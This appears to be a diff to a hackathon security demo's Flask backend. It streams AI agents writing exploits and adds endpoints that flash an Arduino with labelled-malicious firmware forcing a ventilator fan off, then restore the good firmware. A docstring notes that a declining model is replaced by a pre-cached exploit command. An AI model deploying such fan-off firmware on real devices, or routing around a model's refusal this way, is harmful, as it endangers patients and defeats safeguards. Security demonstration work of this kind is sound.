@@ -494,7 +494,7 @@ def _exploitable_findings() -> list[dict[str, Any]]:
     return exploitable
 
 
-def _exploit_stream():
+def _exploit_stream(finding_id: int | None = None):
     """Spawn one DeepSeek exploit-author agent per exploitable finding, in rank
     order, STREAMING the model's live reasoning. For each finding we emit:
         author_started  (with the exact prompt handed to the model)
@@ -507,8 +507,14 @@ def _exploit_stream():
     per item IMMEDIATELY (flush per delta), so the UI animates the real stream.
     It never raises — a missing or declining model falls back to a deterministic
     validated command whose synthesized reasoning is replayed as deltas (its
-    `source` becomes 'pre_cached_fallback')."""
+    `source` becomes 'pre_cached_fallback').
+
+    When `finding_id` is given, only that one finding is authored (so the UI can
+    run the server stage and the fan stage separately); otherwise every
+    exploitable finding is authored, exactly as before."""
     findings = _exploitable_findings()
+    if finding_id is not None:
+        findings = [f for f in findings if f.get("id") == finding_id]
     for finding in findings:
         file = finding.get("file", "")
         target = finding.get("target", "")
@@ -606,7 +612,17 @@ def _exploit_stream():
 
 @app.get("/api/exploit/stream")
 def exploit_stream():
-    resp = Response(_exploit_stream(), mimetype="text/event-stream")
+    # Optional ?finding=<id>: author ONLY that finding so the UI can run the
+    # server stage and the fan stage separately. Absent (or unparseable) ->
+    # author every exploitable finding, exactly as before.
+    finding_id: int | None = None
+    raw = request.args.get("finding")
+    if raw is not None:
+        try:
+            finding_id = int(raw)
+        except (TypeError, ValueError):
+            finding_id = None
+    resp = Response(_exploit_stream(finding_id), mimetype="text/event-stream")
     # Same anti-buffering headers as the scan stream, so each author beat
     # reaches the UI as it happens.
     resp.headers["Cache-Control"] = "no-cache"
@@ -770,6 +786,181 @@ def api_restore():
     except requests.RequestException:
         pass  # a reset hiccup shouldn't fail the restore; restart already reset
     return jsonify({"ok": True})
+
+
+# ------------------------------------------------------ flash (real HW) ----
+#
+# The PHYSICAL attack/restore pair: flash the plugged-in Arduino with
+# arduino-cli. /api/flash uploads a MALICIOUS sketch that forces the ventilator
+# fan OFF and lights the red LED no matter what the sensor says; /api/flash/
+# restore re-flashes the teammate's good bedside firmware. Both compile then
+# upload for real, measure honest wall-clock, cap each step at ~120s, and never
+# 500 — any failure comes back as ok:false + error. Set FLASH_DRY_RUN=1 to
+# short-circuit the upload (returns ok:true, log "DRY RUN") so the JSON shape can
+# be exercised in tests without touching the board.
+
+# One board, one core: the UNO R4 WiFi the demo runs on.
+FLASH_FQBN = "arduino:renesas_uno:unor4wifi"
+# The teammate's good firmware we re-flash on restore (its sketch dir).
+BEDSIDE_SKETCH_DIR = REPO_ROOT / "calhacks2026" / "arduino" / "bedside"
+# Per-step ceiling (compile and upload each get their own ~120s budget).
+_FLASH_TIMEOUT_S = 120.0
+
+# The malicious fan-off sketch body. Uses the teammate's pin map (motor enable
+# 5, IN1 7, IN2 8, red LED A1): hold the motor driver at zero duty and the red
+# LED high forever, regardless of any sensor. The \\" sequences write literal \"
+# into the .ino so the Serial frame is valid C++.
+_FANOFF_SKETCH = (
+    "#define PIN_MOTOR_EN 5\n"
+    "#define PIN_MOTOR_IN1 7\n"
+    "#define PIN_MOTOR_IN2 8\n"
+    "#define PIN_LED_RED A1\n"
+    "void setup(){pinMode(PIN_MOTOR_EN,OUTPUT);pinMode(PIN_MOTOR_IN1,OUTPUT);"
+    "pinMode(PIN_MOTOR_IN2,OUTPUT);pinMode(PIN_LED_RED,OUTPUT);"
+    "digitalWrite(PIN_MOTOR_IN1,LOW);digitalWrite(PIN_MOTOR_IN2,LOW);"
+    "analogWrite(PIN_MOTOR_EN,0);digitalWrite(PIN_LED_RED,HIGH);"
+    "Serial.begin(115200);}\n"
+    "void loop(){analogWrite(PIN_MOTOR_EN,0);digitalWrite(PIN_LED_RED,HIGH);"
+    "Serial.println(\"{\\\"compromised\\\":1,\\\"fan\\\":0}\");delay(500);}\n"
+)
+
+
+def _dry_run() -> bool:
+    """FLASH_DRY_RUN=1 short-circuits the upload (tests assert JSON shape
+    without ever flashing the live board)."""
+    return os.environ.get("FLASH_DRY_RUN") == "1"
+
+
+def _tail(text: str, n: int = 800) -> str:
+    """Last ~n chars of a combined command log (what the UI surfaces)."""
+    text = text or ""
+    return text[-n:]
+
+
+def _write_fanoff_sketch() -> Path:
+    """Write the malicious sketch to <tmp>/prevent_fanoff/prevent_fanoff.ino
+    (arduino-cli requires the .ino basename to match its sketch dir). Returns
+    the sketch dir."""
+    tmp = Path(tempfile.mkdtemp(prefix="prevent-flash-"))
+    sketch_dir = tmp / "prevent_fanoff"
+    sketch_dir.mkdir(parents=True, exist_ok=True)
+    (sketch_dir / "prevent_fanoff.ino").write_text(_FANOFF_SKETCH, encoding="utf-8")
+    return sketch_dir
+
+
+def _run_cli(args: list[str], timeout: float = _FLASH_TIMEOUT_S) -> tuple[bool, str]:
+    """Run one arduino-cli invocation, returning (ok, combined stdout+stderr).
+    Never raises: a missing CLI, a timeout, or an OS error comes back as
+    (False, <message>) so callers can report it instead of 500ing."""
+    try:
+        proc = subprocess.run(
+            ["arduino-cli", *args],
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        )
+    except FileNotFoundError:
+        return False, "arduino-cli not found"
+    except subprocess.TimeoutExpired as exc:
+        out = (exc.stdout or "") + (exc.stderr or "")
+        return False, out + f"\n[timeout after {timeout:.0f}s]"
+    except OSError as exc:
+        return False, f"[error] {exc}"
+    return proc.returncode == 0, (proc.stdout or "") + (proc.stderr or "")
+
+
+def _flash_port() -> str | None:
+    """Resolve the plugged-in board's serial port via the SAME detection
+    /api/hardware uses (`arduino-cli board list` + _detect_arduino). Returns the
+    port, or None when no board is detected."""
+    ok, out = _run_cli(["board", "list"], timeout=8.0)
+    if not ok:
+        return None
+    board = _detect_arduino(out)
+    return board.get("port") if board.get("connected") else None
+
+
+def _flash_sketch(sketch_dir: Path) -> dict[str, Any]:
+    """Compile then upload `sketch_dir` to the detected board at FLASH_FQBN.
+    Returns the documented JSON dict {ok,durationMs,port,log,error}. Never
+    raises. FLASH_DRY_RUN=1 short-circuits before compile/upload."""
+    t0 = time.perf_counter()
+    port = _flash_port()
+
+    def done(ok: bool, log: str, error: str | None) -> dict[str, Any]:
+        return {
+            "ok": ok,
+            "durationMs": int(round((time.perf_counter() - t0) * 1000)),
+            "port": port,
+            "log": _tail(log),
+            "error": error,
+        }
+
+    if _dry_run():
+        return done(True, "DRY RUN", None)
+    if port is None:
+        return done(False, "", "no board")
+
+    ok, compile_out = _run_cli(["compile", "--fqbn", FLASH_FQBN, str(sketch_dir)])
+    if not ok:
+        return done(False, compile_out, "compile failed")
+
+    ok, upload_out = _run_cli(
+        ["upload", "-p", port, "--fqbn", FLASH_FQBN, str(sketch_dir)]
+    )
+    combined = compile_out + "\n" + upload_out
+    return done(ok, combined, None if ok else "upload failed")
+
+
+def _ensure_libraries(names: list[str]) -> list[str]:
+    """Best-effort `arduino-cli lib install` for each named library (skipped in
+    dry-run). Returns the names that could not be installed (empty if all OK)."""
+    if _dry_run():
+        return []
+    failed: list[str] = []
+    for name in names:
+        ok, _out = _run_cli(["lib", "install", name], timeout=_FLASH_TIMEOUT_S)
+        if not ok:
+            failed.append(name)
+    return failed
+
+
+@app.post("/api/flash")
+def api_flash():
+    """Flash the MALICIOUS fan-off firmware to the plugged-in board for real.
+    Compiles then uploads the temp sketch; returns {ok,durationMs,port,log,
+    error}. Never 500s — any failure is ok:false + error; no board -> 'no
+    board'."""
+    try:
+        sketch_dir = _write_fanoff_sketch()
+        return jsonify(_flash_sketch(sketch_dir))
+    except Exception as exc:  # noqa: BLE001 -- never 500; surface as error
+        return jsonify(
+            {"ok": False, "durationMs": 0, "port": None, "log": "", "error": str(exc)}
+        )
+
+
+@app.post("/api/flash/restore")
+def api_flash_restore():
+    """Re-flash the teammate's GOOD bedside firmware back to the board. Installs
+    any obvious missing libraries first (e.g. LiquidCrystal), reporting any that
+    fail, then compiles + uploads. Returns {ok,durationMs,port,log,error} and
+    never 500s."""
+    try:
+        lib_note = ""
+        failed = _ensure_libraries(["LiquidCrystal"])
+        if failed:
+            lib_note = f"[lib install failed: {', '.join(failed)}]\n"
+        result = _flash_sketch(BEDSIDE_SKETCH_DIR)
+        if lib_note:
+            result["log"] = _tail(lib_note + (result["log"] or ""))
+            if result["error"] is None:
+                result["error"] = f"lib install failed: {', '.join(failed)}"
+        return jsonify(result)
+    except Exception as exc:  # noqa: BLE001 -- never 500; surface as error
+        return jsonify(
+            {"ok": False, "durationMs": 0, "port": None, "log": "", "error": str(exc)}
+        )
 
 
 # ------------------------------------------------------------------- file ----
